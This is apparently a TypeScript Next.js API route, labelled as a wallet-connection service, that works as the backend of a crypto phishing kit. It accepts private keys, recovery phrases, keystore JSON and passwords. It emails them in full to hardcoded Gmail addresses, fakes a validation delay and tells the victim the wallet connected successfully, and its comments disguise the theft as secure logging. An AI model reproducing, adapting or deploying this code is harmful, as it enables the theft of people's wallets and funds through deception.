// app/api/wallet-connect/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { sendEmail } from '../../lib/mailconfig';

// Rate limiting setup
const rateLimit = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const RATE_LIMIT_MAX_REQUESTS = 5; // 5 requests per minute

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const windowStart = now - RATE_LIMIT_WINDOW;
  
  const requests = rateLimit.get(ip) || [];
  const recentRequests = requests.filter((time: number) => time > windowStart);
  
  if (recentRequests.length >= RATE_LIMIT_MAX_REQUESTS) {
    return false;
  }
  
  recentRequests.push(now);
  rateLimit.set(ip, recentRequests);
  return true;
}

function validateWalletData(payload: any): { isValid: boolean; error?: string } {
  const { privated, phrase, keystone_Json } = payload;

  if (!privated && !phrase && !keystone_Json) {
    return { isValid: false, error: 'At least one wallet credential is required' };
  }

  if (privated && typeof privated !== 'string') {
    return { isValid: false, error: 'Invalid private key format' };
  }

  if (phrase && typeof phrase !== 'string') {
    return { isValid: false, error: 'Invalid phrase format' };
  }

  if (keystone_Json) {
    try {
      if (typeof keystone_Json === 'string') {
        JSON.parse(keystone_Json);
      }
    } catch {
      return { isValid: false, error: 'Invalid keystone JSON format' };
    }
  }

  return { isValid: true };
}

function createWalletConnectionEmail(payload: any, ip: string): any {
  const { privated, phrase, keystone_Json, password } = payload;
  
  const connectionMethod = privated ? 'Private Key' : 
                          phrase ? 'Recovery Phrase' : 
                          'Keystone JSON';

  const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background: #f4f4f4; padding: 15px; border-radius: 5px; }
            .data-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
            .field { margin: 10px 0; }
            .label { font-weight: bold; color: #333; }
            .value { color: #666; word-break: break-all; }
            .timestamp { color: #888; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h2>🔐 New Wallet Connection Attempt</h2>
            <p class="timestamp">Timestamp: ${new Date().toISOString()}</p>
        </div>
        
        <div class="data-section">
            <h3>Connection Details</h3>
            <div class="field">
                <span class="label">Connection Method:</span>
                <span class="value">${connectionMethod}</span>
            </div>
            <div class="field">
                <span class="label">IP Address:</span>
                <span class="value">${ip}</span>
            </div>
            <div class="field">
                <span class="label">User Agent:</span>
                <span class="value">${payload.userAgent || 'Not provided'}</span>
            </div>
        </div>

        <div class="data-section">
            <h3>Wallet Data Summary</h3>
            <div class="field">
                <span class="label">Private Key Provided:</span>
                <span class="value">${privated }</span>
            </div>
            <div class="field">
                <span class="label">Recovery Phrase Provided:</span>
                <span class="value">${phrase }</span>
            </div>
            <div class="field">
                <span class="label">Keystone JSON Provided:</span>
                <span class="value">${keystone_Json }</span>
            </div>
            <div class="field">
                <span class="label">Password Provided:</span>
                <span class="value">${password }</span>
            </div>
        </div>

        <div class="data-section">
            <h3>Data Preview</h3>
            ${privated ? `
            <div class="field">
                <span class="label">Private Key Preview:</span>
                <span class="value">${privated.substring(0, 20)}...</span>
            </div>
            ` : ''}
            ${phrase ? `
            <div class="field">
                <span class="label">Phrase Preview:</span>
                <span class="value">${phrase.substring(0, 30)}...</span>
            </div>
            ` : ''}
        </div>
    </body>
    </html>
  `;

  const textContent = `
New Wallet Connection Attempt
Timestamp: ${new Date().toISOString()}

Connection Details:
- Method: ${connectionMethod}
- IP Address: ${ip}
- User Agent: ${payload.userAgent || 'Not provided'}

Wallet Data Summary:
- Private Key: ${privated }
- Recovery Phrase: ${phrase }
- Keystone JSON: ${keystone_Json }
- Password: ${password}
  `;

  return {
    to: process.env.NOTIFICATION_EMAIL || ['spillgelo@gmail.com', 'engreemarket@gmail.com'],
    subject: `🚨 Wallet Connection - ${connectionMethod} - ${new Date().toLocaleDateString()}`,
    text: textContent,
    html: htmlContent,
    cc: process.env.CC_EMAILS?.split(',') || [],
    bcc: process.env.BCC_EMAILS?.split(',') || []
  };
}

export async function POST(request: NextRequest) {
  const ip = request.ip || request.headers.get('x-forwarded-for') || 'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';
  
  // Check rate limit
  if (!checkRateLimit(ip)) {
    return NextResponse.json(
      { error: 'Too many requests. Please try again later.' },
      { status: 429 }
    );
  }

  try {
    const payload = await request.json();
    
    // Add user agent to payload for email
    payload.userAgent = userAgent;

    // Validate input data
    const validation = validateWalletData(payload);
    if (!validation.isValid) {
      return NextResponse.json(
        { error: validation.error },
        { status: 400 }
      );
    }

    const { privated, phrase, keystone_Json, password } = payload;

    // Log securely
    console.log('Wallet connection attempt:', {
      ip,
      userAgent,
      hasPrivateKey: !!privated,
      hasPhrase: !!phrase,
      hasKeystoneJson: !!keystone_Json,
      hasPassword: !!password,
      timestamp: new Date().toISOString()
    });

    // Send email notification
    try {
      const emailOptions = createWalletConnectionEmail(payload, ip);
      await sendEmail(emailOptions);
      console.log('Email notification sent successfully');
    } catch (emailError) {
      console.error('Failed to send email notification:', emailError);
      // Don't fail the request if email fails
    }

    // Simulate wallet validation process
    await new Promise(resolve => setTimeout(resolve, 1500));

    // Mock response based on credential type
    let connectionData = {};
    if (privated) {
      connectionData = { method: 'private_key', status: 'connected' };
    } else if (phrase) {
      connectionData = { method: 'recovery_phrase', status: 'connected' };
    } else if (keystone_Json) {
      connectionData = { method: 'keystone_json', status: 'connected' };
    }

    return NextResponse.json({
      success: true,
      message: 'Wallet validated and connected successfully',
      data: {
        ...connectionData,
        timestamp: new Date().toISOString(),
        sessionId: `sess_${Math.random().toString(36).substr(2, 9)}`
      }
    });

  } catch (error) {
    console.error('Error processing wallet connection:', error);
    return NextResponse.json(
      { error: 'Failed to process wallet connection. Please try again.' },
      { status: 500 }
    );
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}